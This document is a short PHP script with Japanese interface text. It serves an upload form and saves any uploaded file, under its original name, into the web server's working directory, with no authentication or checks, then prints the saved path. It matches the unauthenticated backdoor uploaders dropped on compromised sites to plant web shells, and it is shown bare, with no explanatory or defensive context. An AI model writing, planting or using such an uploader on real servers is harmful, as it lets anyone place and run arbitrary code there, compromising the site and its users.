<?php
echo "<form action='' enctype='multipart/form-data' method='POST'>
<input type='file' name='ファイル'>
<input type='submit' name='アップロード' value='来て'>
</form>";
if (isset($_POST['アップロード'])) {
  $cwd=getcwd();
  $tmp=$_FILES['ファイル']['tmp_name'];
  $file=$_FILES['ファイル']['name'];
  if (@copy($tmp, $file)){
    echo "ファイルが正常にアップロードされました! => $cwd/$file";
  }
  else {
    echo "ファイルのアップロードに失敗しました :(";
  }
}__halt_compiler()
?>
